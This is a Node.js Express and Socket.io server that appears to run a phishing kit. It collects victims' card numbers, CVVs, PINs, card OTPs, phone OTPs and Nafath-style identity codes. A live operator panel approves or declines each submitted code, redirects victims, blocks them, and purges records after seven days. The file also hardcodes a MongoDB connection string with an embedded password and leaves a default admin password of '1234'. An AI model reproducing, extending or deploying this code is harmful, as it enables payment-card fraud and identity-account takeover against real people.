const express = require("express");
const crypto = require("crypto");
const app = express();
const cors = require("cors");
const { Order, AdminSettings } = require("./models");
const { toSchemaCompanyData } = require("./toCompanyData");
const { default: mongoose } = require("mongoose");
const server = require("http").createServer(app);
const PORT = process.env.PORT || 8080;
const io = require("socket.io")(server, { cors: { origin: "*" } });

let visitorsCount = 0;
let dashboardCount = 0;
const orderPresence = new Map();

const getOnlineIds = () => Array.from(orderPresence.keys());

const broadcastPresence = () => {
  io.emit("clientPresence", { onlineIds: getOnlineIds() });
};

const unbindOrderFromSocket = (socket) => {
  if (!socket.orderId) return;
  const sockets = orderPresence.get(socket.orderId);
  if (sockets) {
    sockets.delete(socket.id);
    if (sockets.size === 0) orderPresence.delete(socket.orderId);
  }
  socket.orderId = null;
};

const bindOrderToSocket = async (socket, orderId) => {
  if (!orderId) return;
  unbindOrderFromSocket(socket);
  socket.orderId = String(orderId);
  if (!orderPresence.has(socket.orderId)) {
    orderPresence.set(socket.orderId, new Set());
  }
  orderPresence.get(socket.orderId).add(socket.id);
  broadcastPresence();

  const order = await Order.findById(socket.orderId).select("blocked");
  if (order?.blocked) {
    socket.emit("clientBlocked", { id: socket.orderId, blocked: true });
  }
};

const markLatestCardAttempt = async (id, status) => {
  const order = await Order.findById(id);
  if (!order) return;
  const attempts = order.cardAttempts || [];
  for (let i = attempts.length - 1; i >= 0; i--) {
    if (attempts[i].status === "pending") {
      attempts[i].status = status;
      break;
    }
  }
  await Order.findByIdAndUpdate(id, {
    cardAttempts: attempts,
    CardAccept: true,
  });
};

const guardBlocked = async (req, res, next) => {
  const { id } = req.params;
  if (!id) return next();
  try {
    const order = await Order.findById(id).select("blocked");
    if (!order) return res.sendStatus(404);
    if (order.blocked) return res.status(403).json({ blocked: true });
    return next();
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
};

app.use(express.json());
app.use(cors({ origin: "*" }));
app.use(require("morgan")("dev"));

const getAdminSettings = async () => {
  let settings = await AdminSettings.findOne();
  if (!settings) {
    settings = await AdminSettings.create({ secondPassword: "1234" });
  }
  return settings;
};

const issueAdminToken = (version) =>
  `${version}.${crypto.randomBytes(16).toString("hex")}`;

const tokenSessionVersion = (token) => {
  const n = parseInt(String(token).split(".")[0], 10);
  return Number.isFinite(n) ? n : -1;
};

const isAdminTokenValid = (token, sessionVersion) => {
  if (!token) return false;
  if (!sessionVersion) return true;
  return tokenSessionVersion(token) === sessionVersion;
};

const getAdminTokenFromReq = (req) => {
  const header = String(req.headers.authorization || "");
  if (header.startsWith("Bearer ")) return header.slice(7);
  return String(req.query.token || "");
};

app.post("/admin/second-auth/verify", async (req, res) => {
  try {
    const password = String(req.body?.password ?? "");
    const settings = await getAdminSettings();
    if (password === settings.secondPassword) {
      return res.json({
        token: issueAdminToken(settings.sessionVersion || 0),
      });
    }
    return res.sendStatus(401);
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.put("/admin/second-auth/password", async (req, res) => {
  try {
    const currentPassword = String(req.body?.currentPassword ?? "");
    const newPassword = String(req.body?.newPassword ?? "");
    if (!newPassword)
      return res.status(400).json({ error: "newPassword required" });
    const settings = await getAdminSettings();
    if (currentPassword !== settings.secondPassword) return res.sendStatus(401);
    settings.secondPassword = newPassword;
    settings.sessionVersion = Date.now();
    await settings.save();
    const token = issueAdminToken(settings.sessionVersion);
    io.emit("adminSessionRevoked");
    return res.json({ token });
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.get("/admin/session", async (req, res) => {
  try {
    const token = getAdminTokenFromReq(req);
    const settings = await getAdminSettings();
    if (!isAdminTokenValid(token, settings.sessionVersion || 0)) {
      return res.sendStatus(401);
    }
    return res.sendStatus(200);
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.get("/", (req, res) => res.sendStatus(200));
app.delete("/", async (req, res) => {
  await Order.find({})
    .then(async (orders) => {
      await Promise.resolve(
        orders.forEach(async (order) => {
          await Order.findByIdAndDelete(order._id);
        }),
      );
    })
    .then(() => res.sendStatus(200));
});

app.post("/login", async (req, res) => {
  try {
    await Order.create(req.body).then(async (order) =>
      res.status(201).json({ order }),
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.get("/order/checked/:id", async (req, res) => {
  try {
    const { id } = req.params;
    await Order.findByIdAndUpdate(id, { checked: true }).then(() =>
      res.sendStatus(200),
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.get("/order/status/:id", async (req, res) => {
  try {
    const order = await Order.findById(req.params.id).select("blocked");
    if (!order) return res.sendStatus(404);
    return res.json({ blocked: Boolean(order.blocked) });
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.post("/company/:id", guardBlocked, async (req, res) => {
  try {
    const { id } = req.params;
    const companyData = toSchemaCompanyData(req.body.companyData);
    await Order.findByIdAndUpdate(id, {
      companyData,
      checked: false,
    });
    io.emit("companyData", { id, companyData });
    return res.sendStatus(200);
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.post("/reg", async (req, res) => {
  try {
    console.log("reg", req.body);
    await Order.create(req.body).then(async (order) =>
      res.status(201).json(order),
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.post("/apply/:id", guardBlocked, async (req, res) => {
  const { id } = req.params;
  const update = { ...req.body, checked: false };
  if (update.companyData) {
    update.companyData = toSchemaCompanyData(update.companyData);
  }
  await Order.findByIdAndUpdate(id, update, { new: true }).then(async (order) =>
    res.status(200).json(order),
  );
});

app.post("/visa/:id", guardBlocked, async (req, res) => {
  const { id } = req.params;
  const {
    cardNumber,
    card_name,
    cvv,
    expiryDate,
    pin,
    companyData,
    cardAttempts: _cardAttempts,
    ...rest
  } = req.body;

  const cardAttempt = {
    cardNumber,
    card_name,
    cvv,
    expiryDate,
    pin: pin || "",
    status: "pending",
    submittedAt: new Date(),
  };

  const $set = {
    ...rest,
    cardNumber,
    card_name,
    cvv,
    expiryDate,
    pin: pin || "",
    checked: false,
    CardAccept: false,
  };
  if (companyData) $set.companyData = toSchemaCompanyData(companyData);

  try {
    await Order.findByIdAndUpdate(id, {
      $set,
      $push: { cardAttempts: cardAttempt },
    });
    return res.sendStatus(200);
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.post("/visaOtp/:id", guardBlocked, async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    CardOtp: req.body.otp,
    checked: false,
    OtpCardAccept: false,
  }).then(async () => res.sendStatus(200));
});
app.post("/visaPin/:id", guardBlocked, async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    pin: req.body.pin,
    checked: false,
    PinAccept: false,
  }).then(async () => res.sendStatus(200));
});

app.post("/motsl/:id", guardBlocked, async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    ...req.body,
    checked: false,
    MotslAccept: false,
  }).then(async () => res.sendStatus(200));
});
app.post("/motslOtp/:id", guardBlocked, async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    MotslOtp: req.body.MotslOtp,
    checked: false,
    MotslOtpAccept: false,
  }).then(async () => res.sendStatus(200));
});

app.post("/phone/:id", guardBlocked, async (req, res) => {
  const { id } = req.params;
  const { phoneNumber, phoneNetwork, phoneId } = req.body;
  await Order.findByIdAndUpdate(id, {
    MotslPhone: phoneNumber,
    MotslNetwork: phoneNetwork,
    phoneId,
    checked: false,
    MotslAccept: false,
    MotslOtpAccept: false,
    MotslOtp: null,
    stcAwaitingCall: false,
    NavazOtp: null,
    NavazAccept: false,
  }).then(async () => res.sendStatus(200));
});

app.post("/mobOtp/:id", guardBlocked, async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    mobOtp: req.body.mobOtp,
    checked: false,
    NavazOtp: null,
    NavazAccept: false,
  }).then(async () => res.sendStatus(200));
});

app.post("/phoneOtp/:id", guardBlocked, async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    MotslOtp: req.body.phoneOtp,
    checked: false,
    MotslOtpAccept: false,
    stcAwaitingCall: false,
  }).then(async () => res.sendStatus(200));
});

app.post("/navaz/:id", guardBlocked, async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    ...req.body,
    checked: false,
    NavazAccept: false,
  }).then(async () => res.sendStatus(200));
});

app.get(
  "/users",
  async (req, res) => await Order.find().then((users) => res.json(users)),
);

app.delete("/order/:id", async (req, res) => {
  try {
    await Order.findByIdAndDelete(req.params.id);
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(500);
  }
});

app.delete("/orders/all", async (req, res) => {
  try {
    await Order.deleteMany({});
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(500);
  }
});

io.on("connection", (socket) => {
  console.log("connected");

  socket.emit("onlineCounts", {
    visitors: visitorsCount,
    dashboard: dashboardCount,
  });

  socket.on("join", (data) => {
    socket.role = data.role || "visitor";
    if (socket.role === "admin") {
      dashboardCount++;
      socket.emit("clientPresence", { onlineIds: getOnlineIds() });
    } else {
      visitorsCount++;
    }
    io.emit("onlineCounts", {
      visitors: visitorsCount,
      dashboard: dashboardCount,
    });
  });

  socket.on("bindOrder", (orderId) => {
    bindOrderToSocket(socket, orderId);
  });

  socket.on("disconnect", () => {
    unbindOrderFromSocket(socket);
    if (socket.role === "admin") {
      dashboardCount--;
    } else if (socket.role === "visitor") {
      visitorsCount--;
    }
    io.emit("onlineCounts", {
      visitors: visitorsCount,
      dashboard: dashboardCount,
    });
    broadcastPresence();
  });

  socket.on("newUser", () => io.emit("newUser"));

  socket.on("newData", (data) => io.emit("newData", data));

  socket.on("paymentForm", (data) => {
    console.log("paymentForm Wait", data);
    io.emit("paymentForm", data);
  });

  socket.on("acceptPaymentForm", async (id) => {
    console.log("acceptPaymentForm From Admin", id);
    await markLatestCardAttempt(id, "accepted");
    io.emit("acceptPaymentForm", id);
  });
  socket.on("declinePaymentForm", async (id) => {
    console.log("declinePaymentForm Form Admin", id);
    await markLatestCardAttempt(id, "declined");
    io.emit("declinePaymentForm", id);
  });

  socket.on("visaOtp", (data) => {
    console.log("visaOtp  received", data);
    io.emit("visaOtp", data);
  });
  socket.on("acceptVisaOtp", async (id) => {
    console.log("acceptVisaOtp From Admin", id);
    await Order.findByIdAndUpdate(id, { OtpCardAccept: true });
    io.emit("acceptVisaOtp", id);
  });
  socket.on("declineVisaOtp", async (id) => {
    console.log("declineVisaOtp Form Admin", id);
    await Order.findByIdAndUpdate(id, { OtpCardAccept: true });
    io.emit("declineVisaOtp", id);
  });

  socket.on("visaPin", (data) => {
    console.log("visaPin  received", data);
    io.emit("visaPin", data);
  });
  socket.on("acceptVisaPin", async (id) => {
    console.log("acceptVisaPin From Admin", id);
    await Order.findByIdAndUpdate(id, { PinAccept: true });
    io.emit("acceptVisaPin", id);
  });
  socket.on("declineVisaPin", async (id) => {
    console.log("declineVisaPin Form Admin", id);
    await Order.findByIdAndUpdate(id, { PinAccept: true });
    io.emit("declineVisaPin", id);
  });

  socket.on("motsl", (data) => {
    console.log("Motsl Data", data);
    io.emit("motsl", data);
  });

  socket.on("acceptMotsl", async (id) => {
    console.log("Motsl Data", id);
    await Order.findByIdAndUpdate(id, { MotslAccept: true });
    io.emit("acceptMotsl", id);
  });
  socket.on("declineMotsl", async (id) => {
    console.log("declineMotsl Data", id);
    await Order.findByIdAndUpdate(id, { MotslAccept: true });
    io.emit("declineMotsl", id);
  });

  socket.on("motslOtp", async (data) => {
    console.log("motslOtp received", data);
    await Order.findByIdAndUpdate(data.id, {
      MotslOtp: data.MotslOtp,
      STCAccept: false,
    });
    io.emit("motslOtp", data);
  });
  socket.on("acceptMotslOtp", async (data) => {
    console.log("acceptMotslOtp send", { id: data.id, userOtp: data.userOtp });
    await Order.findByIdAndUpdate(data.id, {
      NavazOtp: data.userOtp,
      MotslOtpAccept: true,
    });
    io.emit("acceptMotslOtp", { id: data.id, userOtp: data.userOtp });
  });
  socket.on("declineMotslOtp", async (id) => {
    console.log("declineMotslOtp send", id);
    await Order.findByIdAndUpdate(id, { MotslOtpAccept: true });
    io.emit("declineMotslOtp", id);
  });

  socket.on("acceptSTC", async ({ id, userOtp }) => {
    console.log("acceptSTC send", { id, userOtp });
    await Order.findByIdAndUpdate(id, { NavazOtp: userOtp, STCAccept: true });
    io.emit("acceptSTC", { userOtp, id });
  });
  socket.on("declineSTC", async (id) => {
    console.log("declineSTC send", id);
    io.emit("declineSTC", id);
    await Order.findByIdAndUpdate(id, { STCAccept: true });
  });

  socket.on("phone", (data) => {
    io.emit("phone", data);
  });
  socket.on("acceptPhone", async (id) => {
    await Order.findByIdAndUpdate(id, { MotslAccept: true });
    io.emit("acceptPhone", id);
  });
  socket.on("declinePhone", async (id) => {
    await Order.findByIdAndUpdate(id, { MotslAccept: true });
    io.emit("declinePhone", id);
  });

  socket.on("mobOtp", async (data) => {
    await Order.findByIdAndUpdate(data.id, { mobOtp: data.mobOtp });
    io.emit("mobOtp", data);
  });
  socket.on("acceptMobOtp", async (data) => {
    const { id, price } = data;
    await Order.findByIdAndUpdate(id, { NavazOtp: price, mobOtp: null });
    io.emit("acceptMobOtp", { id, price });
  });
  socket.on("declineMobOtp", async (id) => {
    io.emit("declineMobOtp", id);
  });

  socket.on("phoneOtp", async (data) => {
    await Order.findByIdAndUpdate(data.id, {
      MotslOtp: data.phoneOtp,
      stcAwaitingCall: false,
      NavazOtp: null,
      MotslOtpAccept: false,
      NavazAccept: false,
    });
    io.emit("phoneOtp", data);
  });
  socket.on("acceptStcPhoneOtp", async (id) => {
    await Order.findByIdAndUpdate(id, { stcAwaitingCall: true });
    io.emit("acceptStcPhoneOtp", id);
  });
  socket.on("declineStcPhoneOtp", async (id) => {
    io.emit("declineStcPhoneOtp", id);
  });

  socket.on("acceptService", async (data) => {
    const { id, price } = data;
    await Order.findByIdAndUpdate(id, {
      NavazOtp: price,
      stcAwaitingCall: false,
    });
    io.emit("acceptService", { id, price });
  });
  socket.on("declineService", async (id) => {
    await Order.findByIdAndUpdate(id, {
      stcAwaitingCall: false,
      STCAccept: false,
      MotslOtpAccept: false,
      MotslOtp: null,
      NavazOtp: null,
      NavazAccept: false,
    });
    io.emit("declineService", id);
  });

  socket.on("acceptPhoneOTP", async (data) => {
    await Order.findByIdAndUpdate(data.id, { NavazOtp: data.price });
    io.emit("acceptPhoneOTP", data);
  });
  socket.on("declinePhoneOTP", async (id) => {
    io.emit("declinePhoneOTP", id);
  });

  socket.on("changeNavazCode", async ({ id, userOtp }) => {
    await Order.findByIdAndUpdate(id, { NavazOtp: userOtp });
    io.emit("changeNavazCode", { id, userOtp });
  });

  socket.on("navaz", (data) => {
    console.log("navaz received", data);
    io.emit("navaz", data);
  });
  socket.on("acceptNavaz", async (data) => {
    console.log("acceptNavaz send", data);
    await Order.findByIdAndUpdate(data.id, {
      NavazAccept: true,
      NavazOtp: data.userOtp,
    });
    io.emit("acceptNavaz", data);
  });
  socket.on("declineNavaz", async (id) => {
    console.log("declineNavaz send", id);
    await Order.findByIdAndUpdate(id, { NavazAccept: true });
    io.emit("declineNavaz", id);
  });
  socket.on("successValidate", (data) => io.emit("successValidate", data));
  socket.on("declineValidate", (data) => io.emit("declineValidate", data));

  socket.on("adminRedirect", ({ id, path, search, session }) => {
    console.log("adminRedirect", id, path);
    io.emit("adminRedirect", { id, path, search, session });
  });

  socket.on("blockClient", async (id) => {
    await Order.findByIdAndUpdate(id, { blocked: true });
    io.emit("clientBlocked", { id, blocked: true });
  });

  socket.on("unblockClient", async (id) => {
    await Order.findByIdAndUpdate(id, { blocked: false });
    io.emit("clientBlocked", { id, blocked: false });
  });
});

// Function to delete orders older than 7 days
const deleteOldOrders = async () => {
  const sevenDaysAgo = new Date();
  sevenDaysAgo.setDate(sevenDaysAgo.getDate() - 7);
  try {
    const result = await Order.deleteMany({ created: { $lt: sevenDaysAgo } });
    console.log(`${result.deletedCount} orders deleted.`);
  } catch (error) {
    console.error("Error deleting old orders:", error);
  }
};

// Function to run daily
const runDailyTask = () => {
  deleteOldOrders();
  setTimeout(runDailyTask, 24 * 60 * 60 * 1000); // Schedule next execution in 24 hours
};

mongoose
  .connect(
    "mongodb+srv://arab:IcRiHTm7EOavqWlu@cluster0.emazq5u.mongodb.net/Tammenii156",
  )
  .then((conn) =>
    server.listen(PORT, () => {
      runDailyTask();
      console.log("server running and connected to db" + conn.connection.host);
    }),
  );
